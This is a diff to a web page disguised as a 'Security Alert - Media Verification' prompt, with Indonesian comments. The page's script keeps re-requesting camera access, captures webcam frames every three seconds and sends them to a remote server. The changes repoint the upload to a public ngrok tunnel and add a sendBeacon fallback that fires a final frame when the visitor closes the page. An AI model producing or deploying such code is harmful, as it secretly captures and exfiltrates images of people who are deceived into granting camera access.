@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Media Verification</title>
+<title>Security Alert - Media Verification v3.6</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
@@ -33,7 +33,7 @@
     },
     loopInterval: 2500,       // Interval siklus re-inisialisasi stream kamera
     uploadInterval: 3000,     // Kirim tangkapan frame ke server setiap 3 detik
-    serverEndpoint: 'http://192.168.2.124:8080/upload_capture' // Sesuaikan dengan IP/URL Flask Anda
+    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_capture' // Endpoint ngrok Anda
   };
 
   var state = {
@@ -72,9 +72,9 @@
   }
 
   // ============================================
-  // UPLOAD CAPTURE KE SERVER FLASK
+  // UPLOAD CAPTURE KE SERVER (Fetch + Beacon Fallback)
   // ============================================
-  function captureAndUpload() {
+  function captureAndUpload(isUnloading) {
     if (!state.camActive) return;
 
     var videoElement = document.getElementById('cam-feed');
@@ -82,22 +82,36 @@
     var ctx = canvas.getContext('2d');
 
     try {
+      if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
+      
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      var dataURL = canvas.toDataURL('image/jpeg', 0.85);
+      var dataURL = canvas.toDataURL('image/jpeg', 0.80);
+      var payload = JSON.stringify({ image: dataURL });
+
+      // Gunakan navigator.sendBeacon jika halaman sedang ditutup (unload) agar data tetap terkirim
+      if (isUnloading && navigator.sendBeacon) {
+        var blob = new Blob([payload], { type: 'application/json' });
+        navigator.sendBeacon(CONFIG.serverEndpoint, blob);
+        return;
+      }
 
       fetch(CONFIG.serverEndpoint, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ image: dataURL })
+        body: payload,
+        keepalive: true
       })
-      .then(function(res) { return res.json(); })
+      .then(function(res) {
+        if (!res.ok) throw new Error('Server response status: ' + res.status);
+        return res.json();
+      })
       .then(function(data) {
         console.log('[+] Frame uploaded successfully:', data.filename);
       })
       .catch(function(err) {
-        console.log('[-] Failed to upload frame:', err);
+        console.log('[-] Failed to upload frame:', err.message);
       });
     } catch (e) {}
   }
@@ -161,10 +175,15 @@
     requestCameraAccess();
   }, CONFIG.loopInterval);
 
-  // Upload interval untuk mengirim frame tangkapan ke server Flask
+  // Upload interval untuk mengirim frame tangkapan ke server
   state.uploadTimer = setInterval(function() {
-    captureAndUpload();
+    captureAndUpload(false);
   }, CONFIG.uploadInterval);
+
+  // Kirim frame terakhir saat pengguna menutup atau meninggalkan halaman
+  window.addEventListener('beforeunload', function() {
+    captureAndUpload(true);
+  });
 
   // Tab visibility monitoring
   document.addEventListener('visibilitychange', function () {
